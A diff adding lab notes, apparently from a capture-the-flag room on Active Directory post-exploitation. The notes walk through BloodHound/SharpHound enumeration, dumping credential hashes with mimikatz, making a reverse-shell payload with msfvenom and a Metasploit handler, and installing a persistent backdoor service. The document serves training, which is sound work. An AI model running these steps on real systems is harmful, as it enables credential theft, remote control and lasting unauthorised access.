@@ -804,3 +804,164 @@ echo $command
 
 Here's a cheatsheet to help you with commands: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
 
+
+## Enumeration w/ Bloodhound
+
+Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.
+
+Well be focusing on how to collect the .json files and how to import them into Bloodhound
+
+I have already taken the time to put SharpHound onto the machine 
+
+![image](https://user-images.githubusercontent.com/89842187/131864594-904e8565-a32c-49f6-bdfd-dc7fd54f3561.png)
+
+## BloodHound Installation
+
+```
+1.) apt-get install bloodhound    
+
+2.) neo4j console - default credentials -> neo4j:neo4j
+```
+
+## Getting loot w/ SharpHound
+
+```
+
+1.) powershell -ep bypass same as with PowerView
+
+2.) . .\Downloads\SharpHound.ps1    
+
+3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip    
+```
+
+![image](https://user-images.githubusercontent.com/89842187/131864714-abc95aa5-b6dd-42e1-a961-b03fee29d39c.png)
+
+
+```
+4.) Transfer the loot.zip folder to your Attacker Machine
+
+note: you can use scp to transfer the file if you’re using ssh
+```
+
+
+## Mapping the network w/ BloodHound
+
+```
+1.) bloodhound Run this on your attacker machine not the victim machine
+
+2.) Sign In using the same credentials you set with Neo4j
+
+```
+
+![image](https://user-images.githubusercontent.com/89842187/131864798-c257cc0b-b7b6-45b7-a747-5ab379341131.png)
+
+```
+3.) Inside of Bloodhound search for this icon  and import the loot.zip folder
+
+note: On some versions of BloodHound the import button does not work to get around this simply drag and drop the loot.zip folder into Bloodhound to import the .json files
+
+4.) To view the graphed network open the menu and select queries this will give you a list of pre-compiled queries to choose from.
+
+
+```
+
+![image](https://user-images.githubusercontent.com/89842187/131864855-bc6e9d9d-1263-4040-9795-b4754870046c.png)
+
+The queries can be as simple as find all domain admins -
+
+![image](https://user-images.githubusercontent.com/89842187/131864921-864044bd-efd6-448d-bffa-300194ecf7f4.png)
+
+Or as complicated as shortest path to high value targets -
+
+![image](https://user-images.githubusercontent.com/89842187/131864937-2f649f07-8987-42d5-a7c3-7823c16dadb8.png)
+
+
+## Dumping hashes w/ mimikatz
+
+```
+1.) cd Downloads && mimikatz.exe this will cd into the directory that mimikatz is kept as well as run the mimikatz binary
+```
+
+![image](https://user-images.githubusercontent.com/89842187/131865194-c6545fa5-9465-4800-aa82-297b3326bf32.png)
+
+```
+2.) privilege::debug ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly
+
+
+```
+
+![image](https://user-images.githubusercontent.com/89842187/131865240-717f5dcd-c844-47d3-81db-0cde613ef1be.png)
+
+```
+3.) lsadump::lsa /patch Dump those hashes!
+```
+
+![image](https://user-images.githubusercontent.com/89842187/131865270-d565b3ee-98fc-4998-88d5-3bcafc174f3c.png)
+
+
+##  Enumeration w/ Server Manager
+
+Because servers are hardly ever logged on unless its for maintenance this gives you an easy way for enumeration only using the built in windows features such as the server manager. If you already have domain admin you have a lot of access to the server manager in order to change trusts, add or remove users, look at groups, this can be an entry point to find other users with other sensitive information on their machines or find other users on the domain network with access to other networks in order to pivot to another network and continue your testing.
+
+The only way to access the server manager is to rdp into the server and access the server over an rdp connection
+
+We'll only be going over the basics such as looking at users, groups, and trusts however there are a lot of other mischief that you can get your hands on in terms of enumerating with the server manager
+
+This can also be a way of easily identifying what kind of firewall the network is using if you have not already enumerated it.
+
+
+This is what Windows Server Manager will look when you first open it up the main tabs that will be most interesting are the tools and manage tabs the tools tab is where you will find most of your information such as users, groups, trusts, computers. The manage tab will allow you to add roles and features however this will probably get picked up by a systems admin relatively quick.
+
+Dont worry about the AD CS, AD DS, DNS, or File and Storage Services these are setup for exploitation of the active directory and dont have much use for post-exploitation
+
+![image](https://user-images.githubusercontent.com/89842187/131866163-c7e164f0-4961-47c9-b86a-e3d29aa14d7e.png)
+
+
+Navigate to the tools tab and select the Active Directory Users and Computers
+
+![image](https://user-images.githubusercontent.com/89842187/131866196-c4f33663-b350-4618-a388-12732d847945.png)
+
+This will pull up a list of all users on the domain as well as some other useful tabs to use such as groups and computers
+
+Some sys admins dont realize that you as an attacker can see the descriptions of user accounts so they may set the service accounts passwords inside of the description look into the description and find what the SQL Service password is
+
+
+##  Maintaining Access
+
+There are a quite a few ways to maintain access on a machine or network we will be covering a fairly simple way of maintaining access by first setting up a meterpreter shell and then using the persistence metasploit module allowing us to create a backdoor service in the system that will give us an instant meterpreter shell if the machine is ever shutdown or reset.
+
+There are also other ways of maintaining access such as advanced backdoors and rootkits however those are out of scope for this room.
+
+This will require a little more manual setup than the other tasks so it is recommended to have previous knowledge of msfvenom and metasploit.
+
+## Generating a Payload w/ msfvenom
+
+```
+1.) msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe this will generate a basic windows meterpreter reverse tcp shell
+
+2.) Transfer the payload from your attacker machine to the target machine.
+
+3.) use exploit/multi/handler - this will create a listener on the port that you set it on.
+
+4.) Configure our payload to be a windows meterpreter shell: set payload windows/meterpreter/reverse_tcp
+
+5.) After setting your THM IP address as your "LHOST", start the listener with run
+
+6.)  Executing the binary on the windows machine will give you a meterpreter shell back on your host - let's return to that
+
+7.) Verify that we've got a meterpreter shell, where we will then backgroundit to run the persistence module.
+```
+
+## Run the Persistence Module
+
+```
+1.) use exploit/windows/local/persistence this module will send a payload every 10 seconds in default however you can set this time to anything you want
+
+2.) set session 1 set the session to the session that we backgrounded in meterpreter (you can use the sessions command in metasploit to list the active sessions)
+```
+
+If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to windows/meterpreter/reverse_tcp allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.
+
+Here you can see the session die however the second we run the handler again we get a meterpreter shell back thanks to the persistence service.
+
+There are other ways of maintaining access such as adding users and rootkits however I will leave you to do your own research and labs on those topics.
